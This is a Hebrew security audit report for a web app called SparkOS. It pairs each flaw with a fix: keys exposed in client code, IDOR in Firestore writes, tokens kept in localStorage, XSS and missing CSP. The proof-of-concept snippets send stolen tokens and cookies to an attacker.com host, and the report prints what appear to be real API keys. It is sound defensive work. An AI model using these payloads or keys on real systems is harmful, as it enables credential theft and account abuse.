# דוח ביקורת אבטחה - SparkOS
## Red Team Security Assessment

**תאריך:** 21 דצמבר 2025  
**רמת חומרה:** קריטי - דורש תיקון מיידי  
**הנחת יסוד:** התוקף קרא את כל קוד הפרונט-אנד ומנסה להרוס/לנצל את המערכת

---

## 🔴 סיכונים גבוהים (HIGH RISK) - תיקון מיידי נדרש

### 1. חשיפת API Keys בקוד הקליינט ⚠️ CRITICAL

**קובץ:** [`services/financials/config.ts`](services/financials/config.ts:10-24)

**הבעיה:**
```typescript
export const ALPHA_VANTAGE_API_KEYS: string[] = [
    '31VX3R7A8LRNYPBE',
    'Y6PQGDEJ60OLOY2Q',
    'Z5JTE89CH18DPMHU',
    // ... עוד 4 מפתחות
];

export const FREECRYPTOAPI_KEY = 'l6hhtilmoel0d5ypd172';
```

**Proof of Concept (איך אני הייתי פורץ):**
1. פותח את DevTools → Sources
2. מחפש "API_KEY" או "ALPHA_VANTAGE"
3. מעתיק את כל 7 המפתחות
4. כותב סקריפט פשוט שמבצע 175 בקשות ביום (25×7) ומרוקן את כל המכסה
5. המערכת שלך מפסיקה לעבוד לגמרי

**התיקון:**
```typescript
// ❌ לעולם לא לעשות את זה
export const API_KEY = 'my-secret-key';

// ✅ הדרך הנכונה
// 1. העבר את כל קריאות ה-API לשרת (Firebase Functions/Netlify Functions)
// 2. השרת מחזיק את המפתחות ב-environment variables
// 3. הקליינט קורא לשרת שלך, השרת קורא ל-API החיצוני

// Example: functions/src/financials.ts
export const getStockQuote = functions.https.onCall(async (data, context) => {
  // בדוק authentication
  if (!context.auth) {
    throw new functions.https.HttpsError('unauthenticated', 'Must be logged in');
  }
  
  // בדוק rate limiting לפי user
  await checkUserRateLimit(context.auth.uid);
  
  // קרא ל-API עם המפתח הסודי
  const apiKey = functions.config().alphavantage.key;
  const response = await fetch(`https://www.alphavantage.co/query?apikey=${apiKey}&...`);
  
  return response.json();
});
```

**השפעה:** תוקף יכול למרוקן את כל מכסת ה-API שלך תוך דקות, לגרום ל-DoS, או למכור את המפתחות.

---

### 2. חוסר אימות בצד השרת - IDOR Vulnerability ⚠️ CRITICAL

**קבצים:** [`services/firestoreService.ts`](services/firestoreService.ts:107-123)

**הבעיה:**
```typescript
export const syncPersonalItem = async (userId: string, item: PersonalItem) => {
  const docRef = doc(getPersonalItemsRef(userId), item.id);
  await setDoc(docRef, { ...item, updatedAt: Timestamp.now() }, { merge: true });
};
```

**Proof of Concept:**
```javascript
// התוקף פותח את DevTools Console ומריץ:
import { syncPersonalItem } from './services/firestoreService';

// מזייף userId של משתמש אחר
const victimUserId = 'victim-user-id-123';
const maliciousItem = {
  id: 'hacked',
  title: 'I OWN YOUR DATA',
  type: 'task',
  content: 'All your data belongs to me',
  createdAt: new Date().toISOString()
};

// מזריק נתונים למשתמש אחר!
await syncPersonalItem(victimUserId, maliciousItem);
```

**למה זה עובד:**
- אין בדיקה שה-`userId` שנשלח תואם למשתמש המחובר
- Firebase Security Rules חלשות או לא קיימות
- התוקף יכול לקרוא/לכתוב/למחוק נתונים של כל משתמש

**התיקון:**

1. **Firebase Security Rules (קריטי!):**
```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Default deny
    match /{document=**} {
      allow read, write: if false;
    }
    
    // User data - only owner can access
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
      
      match /personalItems/{itemId} {
        allow read, write: if request.auth != null && request.auth.uid == userId;
      }
      
      match /workoutSessions/{sessionId} {
        allow read, write: if request.auth != null && request.auth.uid == userId;
      }
      
      // Apply to ALL subcollections
      match /{subcollection}/{document=**} {
        allow read, write: if request.auth != null && request.auth.uid == userId;
      }
    }
  }
}
```

2. **קוד צד קליינט - תמיד השתמש ב-currentUser:**
```typescript
// ❌ לעולם לא
export const syncPersonalItem = async (userId: string, item: PersonalItem) => {
  // ...
};

// ✅ הדרך הנכונה
export const syncPersonalItem = async (item: PersonalItem) => {
  const auth = getAuthInstance();
  const userId = auth.currentUser?.uid;
  
  if (!userId) {
    throw new Error('User not authenticated');
  }
  
  // עכשיו Firebase Rules יבדוק שה-userId תואם ל-auth.uid
  const docRef = doc(getPersonalItemsRef(userId), item.id);
  await setDoc(docRef, { ...item, updatedAt: Timestamp.now() }, { merge: true });
};
```

**השפעה:** תוקף יכול לגשת/לשנות/למחוק נתונים של כל משתמש במערכת (IDOR).

---

### 3. Google Access Token ב-localStorage - Token Theft ⚠️ HIGH

**קובץ:** [`services/authService.ts`](services/authService.ts:178-180)

**הבעיה:**
```typescript
localStorage.setItem('google_access_token', accessToken);
localStorage.setItem('google_access_token_expiry', String(Date.now() + 3600000));
```

**Proof of Concept:**
```javascript
// XSS Attack או Browser Extension זדוני:
const stolenToken = localStorage.getItem('google_access_token');

// שולח לשרת של התוקף
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});

// עכשיו התוקף יכול לגשת ל-Google Calendar, Drive, Tasks של הקורבן!
```

**למה זה מסוכן:**
- `localStorage` נגיש לכל JavaScript בדף (כולל XSS)
- אין `httpOnly` flag
- אין `Secure` flag
- Token תקף לשעה שלמה

**התיקון:**

1. **אל תשמור tokens ב-localStorage:**
```typescript
// ❌ רע
localStorage.setItem('google_access_token', accessToken);

// ✅ טוב - השתמש ב-Firebase Auth שמנהל tokens בצורה מאובטחת
// Firebase Auth כבר מטפל ב-token refresh ו-storage מאובטח
const credential = GoogleAuthProvider.credentialFromResult(result);
// אל תשמור את ה-accessToken בכלל!
```

2. **אם חייבים לשמור - השתמש ב-httpOnly cookies דרך השרת:**
```typescript
// Server-side (Firebase Function)
export const storeGoogleToken = functions.https.onCall(async (data, context) => {
  if (!context.auth) throw new Error('Unauthorized');
  
  // שמור ב-Firestore מוצפן
  await db.collection('users').doc(context.auth.uid).set({
    googleToken: encrypt(data.token),
    tokenExpiry: data.expiry
  }, { merge: true });
});

// Client-side
const token = await getGoogleTokenFromServer(); // קריאה מאובטחת דרך Firebase
```

**השפעה:** תוקף יכול לגנוב Google Access Token ולגשת לכל שירותי Google של המשתמש.

---

### 4. XSS Vulnerability - Unsanitized User Input ⚠️ HIGH

**חיפוש בקוד:** לא מצאתי שימוש עקבי ב-DOMPurify

**הבעיה:**
כשמשתמש מזין תוכן (כמו notes, sparks, tasks), אם הקוד מרנדר אותו ישירות ב-`dangerouslySetInnerHTML` בלי sanitization:

**Proof of Concept:**
```javascript
// משתמש זדוני יוצר task עם:
const maliciousTask = {
  title: 'Innocent Task',
  content: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)" />',
  notes: '<script>localStorage.clear(); alert("HACKED")</script>'
};

// כשמשתמש אחר רואה את ה-task, הקוד רץ!
```

**התיקון:**

1. **תמיד השתמש ב-DOMPurify:**
```typescript
import DOMPurify from 'dompurify';

// ❌ מסוכן
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ בטוח
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target']
  })
}} />
```

2. **בדוק את כל המקומות שמרנדרים user input:**
```bash
# חפש בקוד:
grep -r "dangerouslySetInnerHTML" .
grep -r "innerHTML" .
```

**השפעה:** תוקף יכול להריץ JavaScript זדוני בדפדפן של משתמשים אחרים, לגנוב cookies, tokens, או להפיץ malware.

---

### 5. VAPID Key חשוף בקוד ⚠️ MEDIUM-HIGH

**קובץ:** [`services/notificationsService.ts`](services/notificationsService.ts:160)

**הבעיה:**
```typescript
const VAPID_KEY = 'BEqqa1qXcZ72ulC3wzPOvacVxBolYhf63L-4uo36G9OPuo_VbZFt71JsUZj5-1YOPAjvniLMUiEnWGgdV8QDqVM';
```

**למה זה בעיה:**
- VAPID Public Key בעצמו לא סודי (הוא public key)
- אבל אם יש גם Private Key בקוד - זה קריטי
- תוקף יכול לשלוח push notifications מזויפות

**התיקון:**
```typescript
// Public key יכול להישאר (הוא public)
const VAPID_PUBLIC_KEY = import.meta.env.VITE_VAPID_PUBLIC_KEY;

// Private key חייב להיות רק בשרת!
// functions/src/notifications.ts
const VAPID_PRIVATE_KEY = functions.config().vapid.private_key;
```

---

## 🟡 סיכונים בינוניים (MEDIUM RISK)

### 6. חוסר Rate Limiting בצד הקליינט

**הבעיה:** אין הגבלה על מספר הבקשות שמשתמש יכול לבצע

**Proof of Concept:**
```javascript
// תוקף מריץ loop אינסופי
while(true) {
  await syncPersonalItem(maliciousData);
  await syncWorkoutSession(fakeWorkout);
  // מציף את Firestore ב-writes
}
```

**התיקון:**
1. **Firebase Security Rules - Rate Limiting:**
```javascript
// firestore.rules
match /users/{userId}/personalItems/{itemId} {
  allow write: if request.auth.uid == userId 
    && request.time > resource.data.lastWrite + duration.value(1, 's'); // 1 write per second
}
```

2. **App Check (מומלץ מאוד):**
```typescript
// config/firebase.ts
import { initializeAppCheck, ReCaptchaV3Provider } from 'firebase/app-check';

const appCheck = initializeAppCheck(app, {
  provider: new ReCaptchaV3Provider('YOUR_RECAPTCHA_SITE_KEY'),
  isTokenAutoRefreshEnabled: true
});
```

---

### 7. Debug Logs חושפים מידע רגיש

**קובץ:** [`services/ai/geminiClient.ts`](services/ai/geminiClient.ts:17-18)

**הבעיה:**
```typescript
if (import.meta.env.DEV) {
    console.log('[GeminiService] API Key loaded:', API_KEY ? `${API_KEY.substring(0, 10)}...` : 'NOT SET');
}
```

**למה זה בעיה:**
- גם ב-DEV mode, console logs נשארים בזיכרון
- Browser extensions יכולים לקרוא console history
- 10 תווים ראשונים של API key עדיין מידע רגיש

**התיקון:**
```typescript
// ❌ אל תלוג API keys בכלל
console.log('API Key:', API_KEY.substring(0, 10));

// ✅ רק status
console.log('[GeminiService] API Key:', API_KEY ? 'Configured' : 'Missing');
```

---

### 8. חוסר Content Security Policy (CSP)

**קובץ:** [`index.html`](index.html:1-37)

**הבעיה:** אין CSP headers, מאפשר inline scripts ו-eval

**התיקון:**

1. **הוסף CSP ב-netlify.toml:**
```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = """
      default-src 'self';
      script-src 'self' 'unsafe-inline' https://apis.google.com https://accounts.google.com;
      style-src 'self' 'unsafe-inline' https://api.fontshare.com;
      img-src 'self' data: https:;
      connect-src 'self' https://*.googleapis.com https://*.firebaseio.com https://api.alphavantage.co https://api.freecryptoapi.com;
      font-src 'self' https://api.fontshare.com;
      frame-src 'self' https://accounts.google.com;
    """
    X-Content-Type-Options = "nosniff"
    X-Frame-Options = "DENY"
    X-XSS-Protection = "1; mode=block"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
```

---

### 9. Sensitive Data ב-sessionStorage

**דוגמה:** [`src/contexts/NavigationContext.tsx`](src/contexts/NavigationContext.tsx:79)

```typescript
sessionStorage.setItem('preselect_add_defaults', JSON.stringify(defaults));
```

**בעיה:** sessionStorage נגיש ל-XSS, אל תשמור שם sensitive data

**התיקון:** השתמש ב-React state או Context API במקום

---

## 🔵 המלצות להקשחת אבטחה (Security Hardening)

### 10. הוסף Security Headers נוספים

```toml
# netlify.toml
[[headers]]
  for = "/*"
  [headers.values]
    Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
    X-Content-Type-Options = "nosniff"
    X-Frame-Options = "DENY"
    X-XSS-Protection = "1; mode=block"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
    Cross-Origin-Embedder-Policy = "require-corp"
    Cross-Origin-Opener-Policy = "same-origin"
    Cross-Origin-Resource-Policy = "same-origin"
```

---

### 11. הצפן Sensitive Data ב-IndexedDB

**קובץ:** [`services/db/indexedDBCore.ts`](services/db/indexedDBCore.ts:1-263)

**המלצה:** הצפן workout data, personal items לפני שמירה ב-IndexedDB

```typescript
import { encryptString, decryptToString } from './cryptoService';

export const dbPutEncrypted = async <T>(storeName: string, item: T, key: CryptoKey): Promise<void> => {
  const encrypted = await encryptString(JSON.stringify(item), key);
  return dbPut(storeName, { ...item, _encrypted: encrypted });
};
```

---

### 12. Implement Audit Logging

```typescript
// services/auditLog.ts
export const logSecurityEvent = async (event: {
  type: 'login' | 'logout' | 'data_access' | 'data_modify' | 'failed_auth';
  userId: string;
  ip?: string;
  userAgent?: string;
  details?: any;
}) => {
  await db.collection('audit_logs').add({
    ...event,
    timestamp: Timestamp.now(),
    sessionId: getSessionId()
  });
};
```

---

### 13. הוסף Input Validation

```typescript
// utils/validation.ts
export const sanitizeInput = (input: string, maxLength: number = 1000): string => {
  return DOMPurify.sanitize(input.trim().slice(0, maxLength));
};

export const validateEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};

export const validateUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};
```

---

### 14. Implement CSRF Protection

```typescript
// utils/csrf.ts
export const generateCSRFToken = (): string => {
  return crypto.randomUUID();
};

export const validateCSRFToken = (token: string, storedToken: string): boolean => {
  return token === storedToken;
};

// שמור ב-httpOnly cookie דרך השרת
```

---

### 15. הוסף Monitoring & Alerting

```typescript
// services/securityMonitoring.ts
export const detectAnomalies = async (userId: string) => {
  const recentActions = await getRecentActions(userId);
  
  // Detect suspicious patterns
  if (recentActions.length > 100 in last 1 minute) {
    await alertAdmin({
      type: 'rate_limit_exceeded',
      userId,
      count: recentActions.length
    });
  }
  
  // Detect unusual locations
  const currentIP = await getCurrentIP();
  const lastKnownIP = await getLastKnownIP(userId);
  if (currentIP !== lastKnownIP) {
    await notifyUser({
      type: 'new_location_detected',
      ip: currentIP
    });
  }
};
```

---

## 📊 סיכום וסדרי עדיפויות

### תיקונים קריטיים (לתקן היום):
1. ✅ העבר API keys לשרת (Firebase Functions)
2. ✅ הוסף Firebase Security Rules
3. ✅ הסר Google Access Token מ-localStorage
4. ✅ הוסף DOMPurify לכל user input
5. ✅ הוסף CSP headers

### תיקונים חשובים (לתקן השבוע):
6. ✅ הוסף Rate Limiting
7. ✅ הסר debug logs עם sensitive data
8. ✅ הוסף App Check
9. ✅ הצפן data ב-IndexedDB
10. ✅ הוסף audit logging

### שיפורים (לתקן החודש):
11. ✅ Implement CSRF protection
12. ✅ הוסף security monitoring
13. ✅ הוסף input validation
14. ✅ Code review תקופתי
15. ✅ Penetration testing

---

## 🎯 Action Items

```markdown
- [ ] צור Firebase Functions project
- [ ] העבר את כל קריאות ה-API החיצוניות לשרת
- [ ] כתוב Firebase Security Rules מקיפות
- [ ] הסר את כל ה-API keys מהקוד
- [ ] הוסף DOMPurify לכל dangerouslySetInnerHTML
- [ ] הוסף CSP headers ב-netlify.toml
- [ ] הוסף Firebase App Check
- [ ] צור audit log system
- [ ] כתוב tests לבדיקות אבטחה
- [ ] תעד את כל השינויים
```

---

**סיכום:** המערכת חשופה למספר פרצות אבטחה קריטיות. התיקונים הנדרשים הם ישימים ולא מורכבים, אבל חייבים להתבצע בהקדם. התוקף שקרא את הקוד יכול לנצל את הפרצות האלה תוך דקות.

**המלצה:** התחל מהתיקונים הקריטיים (1-5) והתקדם בסדר עדיפויות.
